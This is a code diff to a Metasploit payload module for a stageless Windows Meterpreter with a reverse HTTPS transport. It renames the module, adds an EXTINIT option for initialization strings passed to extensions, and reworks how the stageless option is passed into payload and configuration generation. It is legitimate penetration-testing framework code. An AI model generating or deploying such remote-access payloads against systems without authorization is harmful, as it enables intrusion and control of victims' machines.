@@ -11,9 +11,9 @@ require 'msf/base/sessions/meterpreter_x86_win'
 require 'msf/base/sessions/meterpreter_options'
 require 'rex/payloads/meterpreter/config'
 
-module Metasploit4
+module MetasploitModule
 
-  CachedSize = 958530
+  CachedSize = 958531
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Windows
@@ -35,17 +35,18 @@ module Metasploit4
       ))
 
     register_options([
-      OptString.new('EXTENSIONS', [false, "Comma-separate list of extensions to load"]),
+      OptString.new('EXTENSIONS', [false, 'Comma-separate list of extensions to load']),
+      OptString.new('EXTINIT',    [false, 'Initialization strings for extensions'])
     ], self.class)
   end
 
-  def generate
-    stage_meterpreter(true) + generate_config
+  def generate(opts={})
+    opts[:stageless] = true
+    stage_meterpreter(opts) + generate_config(opts)
   end
 
   def generate_config(opts={})
     opts[:uuid] ||= generate_payload_uuid
-    opts[:stageless] = true
 
     # create the configuration block
     config_opts = {
@@ -54,7 +55,8 @@ module Metasploit4
       expiration: datastore['SessionExpirationTimeout'].to_i,
       uuid:       opts[:uuid],
       transports: [transport_config_reverse_https(opts)],
-      extensions: (datastore['EXTENSIONS'] || '').split(',')
+      extensions: (datastore['EXTENSIONS'] || '').split(','),
+      ext_init:   (datastore['EXTINIT'] || '')
     }
 
     # create the configuration instance based off the parameters
